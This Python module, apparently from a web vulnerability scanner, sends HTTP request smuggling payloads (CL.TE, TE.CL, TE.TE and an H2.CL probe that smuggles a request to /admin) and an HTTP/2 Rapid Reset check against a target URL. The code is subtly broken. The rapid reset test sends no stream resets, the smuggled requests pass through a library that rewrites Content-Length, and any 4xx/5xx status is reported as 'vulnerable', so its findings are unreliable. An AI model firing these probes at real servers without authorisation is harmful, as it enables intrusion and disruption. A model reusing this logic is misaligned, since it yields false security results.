"""HTTP/2 and HTTP request smuggling tests."""

from __future__ import annotations

import logging
from dataclasses import dataclass
from typing import Any

import requests


logger = logging.getLogger(__name__)


@dataclass
class SmugglingResult:
    test_name: str
    vulnerable: bool
    description: str
    evidence: str = ""
    severity: str = "high"


def test_http2_rapid_reset(url: str, headers: dict[str, str] | None = None) -> SmugglingResult:
    """Test HTTP/2 Rapid Reset (CVE-2023-44487) - DoS via stream reset flood."""
    try:
        import httpx

        # Send rapid RST_STREAM frames
        try:
            with httpx.Client(http2=True, verify=False, timeout=10) as client:
                # Send a request and immediately reset
                for _ in range(5):
                    try:
                        resp = client.get(url, headers=headers or {})
                    except Exception:
                        pass

                # If server is still responding, it handled the rapid reset
                resp = client.get(url, headers=headers or {})
                return SmugglingResult(
                    test_name="HTTP/2 Rapid Reset",
                    vulnerable=False,
                    description="Server handled rapid reset without crashing",
                    evidence=f"Server responded with status {resp.status_code}",
                )

        except ImportError:
            # httpx not available, try raw socket approach
            return SmugglingResult(
                test_name="HTTP/2 Rapid Reset",
                vulnerable=False,
                description="httpx not available for HTTP/2 testing",
            )

    except Exception as exc:
        return SmugglingResult(
            test_name="HTTP/2 Rapid Reset",
            vulnerable=False,
            description=f"Test inconclusive: {exc}",
        )


def test_cl_te_smuggling(url: str, headers: dict[str, str] | None = None) -> SmugglingResult:
    """Test CL.TE (Content-Length vs Transfer-Encoding) request smuggling."""
    try:
        # Craft a smuggled request
        smuggled = (
            "POST / HTTP/1.1\r\n"
            "Host: target\r\n"
            "Content-Length: 6\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
            "X"
        )

        resp = requests.post(
            url,
            data=smuggled.encode(),
            headers={
                "Host": url.split("//")[1].split("/")[0],
                "Content-Length": str(len(smuggled)),
            },
            timeout=10,
            verify=False,
        )

        # If the smuggled request causes a different response
        if resp.status_code in (502, 500, 400):
            return SmugglingResult(
                test_name="CL.TE Smuggling",
                vulnerable=True,
                description="Server may be vulnerable to CL.TE request smuggling",
                evidence=f"Status {resp.status_code} - server may have processed smuggled request",
                severity="critical",
            )

        return SmugglingResult(
            test_name="CL.TE Smuggling",
            vulnerable=False,
            description="Server rejected the smuggled request format",
        )

    except Exception as exc:
        return SmugglingResult(
            test_name="CL.TE Smuggling",
            vulnerable=False,
            description=f"Test inconclusive: {exc}",
        )


def test_te_cl_smuggling(url: str, headers: dict[str, str] | None = None) -> SmugglingResult:
    """Test TE.CL (Transfer-Encoding vs Content-Length) request smuggling."""
    try:
        smuggled = (
            "POST / HTTP/1.1\r\n"
            f"Host: {url.split('//')[1].split('/')[0]}\r\n"
            "Content-Length: 3\r\n"
            "Transfer-Encoding: chunked\r\n"
            "\r\n"
            "8\r\n"
            "SMUGGLED\r\n"
            "0\r\n"
            "\r\n"
        )

        resp = requests.post(
            url,
            data=smuggled.encode(),
            headers={
                "Host": url.split("//")[1].split("/")[0],
                "Content-Length": str(len(smuggled)),
            },
            timeout=10,
            verify=False,
        )

        if resp.status_code in (502, 500, 400):
            return SmugglingResult(
                test_name="TE.CL Smuggling",
                vulnerable=True,
                description="Server may be vulnerable to TE.CL request smuggling",
                evidence=f"Status {resp.status_code}",
                severity="critical",
            )

        return SmugglingResult(
            test_name="TE.CL Smuggling",
            vulnerable=False,
            description="Server rejected the smuggled request format",
        )

    except Exception as exc:
        return SmugglingResult(
            test_name="TE.CL Smuggling",
            vulnerable=False,
            description=f"Test inconclusive: {exc}",
        )


def test_te_te_smuggling(url: str, headers: dict[str, str] | None = None) -> SmugglingResult:
    """Test TE.TE (obfuscated Transfer-Encoding) request smuggling."""
    try:
        smuggled = (
            "POST / HTTP/1.1\r\n"
            f"Host: {url.split('//')[1].split('/')[0]}\r\n"
            "Transfer-Encoding: chunked\r\n"
            "Transfer-Encoding: x\r\n"
            "\r\n"
            "0\r\n"
            "\r\n"
        )

        resp = requests.post(
            url,
            data=smuggled.encode(),
            headers={
                "Host": url.split("//")[1].split("/")[0],
            },
            timeout=10,
            verify=False,
        )

        if resp.status_code in (502, 500, 400):
            return SmugglingResult(
                test_name="TE.TE Smuggling (obfuscated)",
                vulnerable=True,
                description="Server may be vulnerable to TE.TE smuggling with obfuscated encoding",
                evidence=f"Status {resp.status_code}",
                severity="critical",
            )

        return SmugglingResult(
            test_name="TE.TE Smuggling (obfuscated)",
            vulnerable=False,
            description="Server rejected obfuscated Transfer-Encoding",
        )

    except Exception as exc:
        return SmugglingResult(
            test_name="TE.TE Smuggling (obfuscated)",
            vulnerable=False,
            description=f"Test inconclusive: {exc}",
        )


def test_h2_cl_smuggling(url: str, headers: dict[str, str] | None = None) -> SmugglingResult:
    """Test HTTP/2 to HTTP/1.1 CL smuggling (H2.CL)."""
    try:
        import httpx

        with httpx.Client(http2=True, verify=False, timeout=10) as client:
            # Send a request with mismatched content-length
            resp = client.post(
                url,
                content=b"0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n",
                headers={
                    "Content-Type": "application/x-www-form-urlencoded",
                    "Content-Length": "5",
                },
            )

            if resp.status_code == 200 and "admin" in resp.text.lower():
                return SmugglingResult(
                    test_name="H2.CL Smuggling",
                    vulnerable=True,
                    description="HTTP/2 to HTTP/1.1 content-length smuggling possible",
                    evidence="Smuggled request reached /admin endpoint",
                    severity="critical",
                )

        return SmugglingResult(
            test_name="H2.CL Smuggling",
            vulnerable=False,
            description="Server rejected mismatched content-length in HTTP/2",
        )

    except ImportError:
        return SmugglingResult(
            test_name="H2.CL Smuggling",
            vulnerable=False,
            description="httpx not available for HTTP/2 testing",
        )
    except Exception as exc:
        return SmugglingResult(
            test_name="H2.CL Smuggling",
            vulnerable=False,
            description=f"Test inconclusive: {exc}",
        )


def run_all_smuggling_tests(url: str, headers: dict[str, str] | None = None) -> list[SmugglingResult]:
    """Run all HTTP smuggling tests."""
    results = []
    results.append(test_cl_te_smuggling(url, headers))
    results.append(test_te_cl_smuggling(url, headers))
    results.append(test_te_te_smuggling(url, headers))
    results.append(test_h2_cl_smuggling(url, headers))
    results.append(test_http2_rapid_reset(url, headers))
    return results
